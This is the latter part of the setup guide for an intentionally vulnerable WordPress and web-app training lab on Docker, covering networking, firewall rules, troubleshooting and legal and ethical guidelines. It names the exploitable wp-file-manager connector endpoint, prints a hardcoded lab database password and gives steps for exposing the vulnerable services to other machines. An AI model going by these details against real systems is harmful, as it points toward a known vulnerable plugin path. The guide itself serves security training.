**View running containers:**
```bash
docker ps
```

**Check resource usage:**
```bash
docker stats
```

**Inspect network:**
```bash
docker network inspect vulnapp-network
```

**Check volumes:**
```bash
docker volume ls
docker volume inspect wordpress-data
```

---

## 9. Network Configuration

### 9.1 Docker Network Architecture

All containers are connected to `vulnapp-network` (bridge network):

```
vulnapp-network (172.18.0.0/16)
├── vulnapp-webapp (172.18.0.2)
├── nginx-proxy-manager (172.18.0.3)
├── vulnerable-wordpress (172.18.0.4)
├── wordpress-mysql (172.18.0.5)
├── supabase_kong_managment (172.18.0.10)
├── supabase_db_managment (172.18.0.11)
└── ... (other Supabase containers)
```

**Inter-container communication:**
- Containers can communicate using container names as hostnames
- Example: `vulnapp-webapp` can reach `vulnerable-wordpress`
- No need for `localhost` or IP addresses

### 9.2 Port Mappings

| Container | Internal Port | Host Port | Purpose |
|-----------|---------------|-----------|---------|
| vulnapp-webapp | 80 | 3000 | Web app (direct) |
| nginx-proxy-manager | 80, 443, 81 | 80, 443, 81 | HTTP, HTTPS, Admin |
| vulnerable-wordpress | 80 | 8080 | WordPress (direct) |
| wordpress-mysql | 3306 | - | MySQL (internal only) |
| supabase_kong | 8000 | 54321 | Supabase API |
| supabase_db | 5432 | 54322 | PostgreSQL |
| supabase_studio | 3000 | 54323 | Supabase Studio |

### 9.3 Firewall Configuration

**Linux (UFW):**
```bash
# Allow NPM ports
sudo ufw allow 80/tcp
sudo ufw allow 81/tcp
sudo ufw allow 443/tcp

# Allow direct access (optional)
sudo ufw allow 3000/tcp   # Web app
sudo ufw allow 8080/tcp   # WordPress

# Allow Supabase (if needed)
sudo ufw allow 54321:54327/tcp
```

**Linux (iptables):**
```bash
# Allow NPM
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 81 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Save rules
sudo iptables-save > /etc/iptables/rules.v4
```

**Windows Firewall:**
```powershell
# Run as Administrator
New-NetFirewallRule -DisplayName "NPM HTTP" -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "NPM Admin" -Direction Inbound -LocalPort 81 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "NPM HTTPS" -Direction Inbound -LocalPort 443 -Protocol TCP -Action Allow
```

### 9.4 Remote Access Configuration

**For network access from other machines:**

1. **Find host IP:**
```bash
# Linux/macOS
hostname -I | awk '{print $1}'

# Windows
ipconfig | findstr IPv4
```

2. **Update NPM configuration:**
- Edit proxy hosts in NPM admin
- Change Supabase forward IP from `localhost` to host IP

3. **Update remote machine hosts file:**
```
<HOST_IP>    project.tujuh
<HOST_IP>    wordpress.tujuh
```

4. **Test from remote machine:**
```bash
curl -I http://project.tujuh
curl -I http://wordpress.tujuh
```

---

## 10. Troubleshooting

### 10.1 Port Conflicts

**Problem:** Port already in use

**Solution:**
```bash
# Find what's using the port
sudo lsof -i :80
sudo lsof -i :81
sudo lsof -i :8080

# Kill the process
sudo kill -9 <PID>

# Or change port in docker-compose.yml
```

### 10.2 Docker Issues

**Problem:** Docker not running

**Solution:**
```bash
# Linux
sudo systemctl start docker
sudo systemctl status docker

# macOS/Windows
# Start Docker Desktop application
```

**Problem:** Permission denied

**Solution:**
```bash
# Add user to docker group
sudo usermod -aG docker $USER
newgrp docker

# Test
docker ps
```

### 10.3 Supabase Issues

**Problem:** Supabase won't start

**Solution:**
```bash
# Stop all instances
supabase stop --no-backup

# Clear duplicate projects
supabase stop --project-id managment

# Remove volumes
docker volume ls | grep supabase | awk '{print $2}' | xargs docker volume rm

# Start fresh
supabase start
```

**Problem:** Port 54321 already in use

**Solution:**
```bash
# Check what's using it
sudo lsof -i :54321

# Stop Supabase completely
./scripts/stop.sh

# Restart
./scripts/deploy.sh
```

### 10.4 WordPress Issues

**Problem:** WordPress shows localhost URLs

**Solution:**
```bash
# Fix URLs in database
docker exec wordpress-mysql mysql -u wordpress -pvulnerable_wp_pass wordpress \
  -e "UPDATE wp_options SET option_value='http://wordpress.tujuh' WHERE option_name IN ('siteurl', 'home');"

# Verify
docker exec wordpress-mysql mysql -u wordpress -pvulnerable_wp_pass wordpress \
  -e "SELECT option_name, option_value FROM wp_options WHERE option_name IN ('siteurl', 'home');"
```

**Problem:** Can't upload plugins

**Solution:**
```bash
# Increase upload limit
docker exec vulnerable-wordpress bash -c "echo 'upload_max_filesize = 64M' >> /usr/local/etc/php/conf.d/uploads.ini"
docker exec vulnerable-wordpress bash -c "echo 'post_max_size = 64M' >> /usr/local/etc/php/conf.d/uploads.ini"
docker-compose restart wordpress
```

**Problem:** MySQL connection errors

**Solution:**
```bash
# Wait for MySQL to be ready
sleep 30

# Check MySQL is running
docker ps | grep mysql

# Check MySQL logs
docker logs wordpress-mysql

# Restart WordPress
docker-compose restart wordpress
```

### 10.5 NPM Issues

**Problem:** 502 Bad Gateway

**Solution:**
```bash
# Check target container is running
docker ps | grep vulnerable-wordpress
docker ps | grep vulnapp-webapp

# Check network connection
docker network inspect vulnapp-network | grep -A 5 vulnerable-wordpress

# Reconnect to network
docker network connect vulnapp-network vulnerable-wordpress
docker network connect vulnapp-network vulnapp-webapp

# Restart NPM
docker-compose restart nginx-proxy-manager
```

**Problem:** Can't access NPM admin

**Solution:**
```bash
# Check NPM is running
docker ps | grep nginx-proxy-manager

# Check port binding
sudo netstat -tlnp | grep :81

# Restart NPM
docker-compose restart nginx-proxy-manager

# Access via localhost
curl -I http://localhost:81
```

### 10.6 DNS Issues

**Problem:** Domain not resolving

**Solution:**
```bash
# Linux/macOS - check hosts file
cat /etc/hosts | grep tujuh

# Windows - check hosts file
type C:\Windows\System32\drivers\etc\hosts | findstr tujuh

# Test DNS resolution
ping project.tujuh
ping wordpress.tujuh

# Flush DNS cache (Windows)
ipconfig /flushdns

# Flush DNS cache (macOS)
sudo dscacheutil -flushcache

# Flush DNS cache (Linux)
sudo systemd-resolve --flush-caches
```

### 10.7 Exploit Script Issues

**Problem:** Python script won't run

**Solution:**
```bash
# Check Python version
python3 --version

# Install required libraries
pip3 install requests beautifulsoup4

# Run with verbose output
python3 -v script.py
```

**Problem:** Exploit fails

**Solution:**
```bash
# Verify plugin is installed
docker exec vulnerable-wordpress wp plugin list --allow-root

# Check plugin is activated
docker exec vulnerable-wordpress wp plugin status wp-file-manager --allow-root

# Test endpoint manually
curl -I http://wordpress.tujuh/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
```

### 10.8 Network Access Issues

**Problem:** Can't access from remote machine

**Solution:**
```bash
# Check firewall on host
sudo ufw status
sudo ufw allow 80/tcp

# Verify service is listening
sudo netstat -tlnp | grep :80

# Check Docker network
docker network inspect vulnapp-network

# Test from host first
curl -I http://localhost:80 -H "Host: project.tujuh"

# Then test from remote
curl -I http://<HOST_IP>:80 -H "Host: project.tujuh"
```

---

## 11. Legal & Ethical Guidelines

### 11.1 Legal Disclaimer

**⚠️ CRITICAL LEGAL NOTICE ⚠️**

This repository contains **INTENTIONALLY VULNERABLE** applications designed **EXCLUSIVELY** for:

### ✅ Authorized Use Only

1. **Educational Purposes**
   - Security training in controlled environments
   - Academic coursework and assignments
   - Professional certifications (CEH, OSCP, etc.)

2. **Security Research**
   - DevSecOps laboratories
   - Penetration testing practice
   - Understanding attack vectors

3. **Controlled Testing**
   - Isolated lab networks only
   - Private virtual machines
   - Sandboxed environments

### ❌ Strictly Prohibited

1. **Unauthorized Access**
   - Testing on systems you don't own
   - Testing without explicit written permission
   - Testing on production systems

2. **Public Exposure**
   - Deploying on public internet
   - Hosting on public servers
   - Making vulnerabilities publicly accessible

3. **Malicious Use**
   - Using for illegal purposes
   - Causing harm to systems or data
   - Distributing malware
   - Attacking real targets

### 11.2 Legal Consequences

**Unauthorized computer access is a crime in most jurisdictions:**

**United States:**
- Computer Fraud and Abuse Act (CFAA)
- Penalties: Up to 20 years imprisonment + fines
- Civil liability for damages

**European Union:**
- Directive 2013/40/EU on attacks against information systems
- Criminal penalties vary by member state
- Extraditable offense

**United Kingdom:**
- Computer Misuse Act 1990
- Penalties: Up to 10 years imprisonment

**International:**
- Council of Europe Convention on Cybercrime
- Recognized by 60+ countries
- International cooperation for prosecution

**Additional Consequences:**
- ❌ Civil lawsuits for damages
- ❌ Professional license revocation
- ❌ Termination from employment/education
- ❌ Permanent criminal record
- ❌ Extradition to prosecuting country

### 11.3 Ethical Hacking Principles

1. **Always Get Permission**
   - Written authorization required
   - Define scope and boundaries
   - Specify allowed techniques

2. **Practice Responsible Disclosure**
   - Report vulnerabilities privately
   - Allow reasonable time to patch (typically 90 days)
   - Follow coordinated disclosure
   - Don't publish exploits without vendor fix

3. **Respect Privacy and Data**
   - Don't access or exfiltrate real user data
   - Don't share or sell discovered information
   - Securely delete any captured data

4. **Minimize Harm**
   - Don't cause service disruptions
   - Don't modify or delete data
   - Don't install persistent access tools

5. **Know Your Limits**
   - Stay within authorized scope
   - Know when to stop
   - Escalate concerns appropriately

### 11.4 Bug Bounty Programs

**If you discover real vulnerabilities, use official channels:**

- **HackerOne:** https://www.hackerone.com/
- **Bugcrowd:** https://www.bugcrowd.com/
- **Synack:** https://www.synack.com/
- **Intigriti:** https://www.intigriti.com/
- **YesWeHack:** https://www.yeswehack.com/

**CERT Coordination Center:** https://www.kb.cert.org/vuls/

### 11.5 Safe Testing Guidelines

1. **Use Isolated Networks**
   - Separate VLANs
   - Virtual machines with snapshots
   - Containers with network isolation

2. **Document Everything**
   - Keep detailed logs
   - Record all actions taken
   - Maintain chain of custody

3. **Never Test on Production**
   - Always use test/staging environments
   - Replicate environments if needed
   - Get explicit permission for test systems

4. **Understand the Law**
   - Research local laws
   - Consult with legal counsel if unsure
   - Better safe than sorry

### 11.6 Acknowledgment

**By using this repository, you agree to:**

1. Use ONLY in isolated, controlled lab environments
2. Never deploy on public networks or systems
3. Practice responsible and ethical hacking
4. Comply with all applicable laws and regulations
5. Not hold the authors liable for any misuse
6. Report any discovered real-world vulnerabilities responsibly

**Remember:** *"With great power comes great responsibility."*

**This lab exists to make the internet safer by training security professionals. Use it wisely, ethically, and legally.**

---

## 📚 Additional Resources

### Security Learning
- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **PortSwigger Web Security Academy:** https://portswigger.net/web-security (free!)
- **HackTheBox:** https://www.hackthebox.com/
- **TryHackMe:** https://tryhackme.com/
- **PentesterLab:** https://pentesterlab.com/

### WordPress Security
- **WPScan:** https://wpscan.com/
- **WordPress Security Whitepaper:** https://wordpress.org/about/security/
- **Wordfence Blog:** https://www.wordfence.com/blog/
- **Sucuri Blog:** https://blog.sucuri.net/

### CVE Databases
- **NIST NVD:** https://nvd.nist.gov/
- **CVE Details:** https://www.cvedetails.com/
- **Exploit-DB:** https://www.exploit-db.com/
- **MITRE CVE:** https://cve.mitre.org/

### Docker & DevOps
- **Docker Documentation:** https://docs.docker.com/
- **Docker Security:** https://docs.docker.com/engine/security/
- **Supabase Documentation:** https://supabase.com/docs

---

**Version:** 2.1  
**Last Updated:** October 18, 2025  
**Maintainer:** DevSecOps Lab Team  

**Questions or Issues?**  
Open an issue on the repository or consult individual documentation files.

---

**🎯 Happy Ethical Hacking! Stay Legal. Stay Safe. 🛡️**
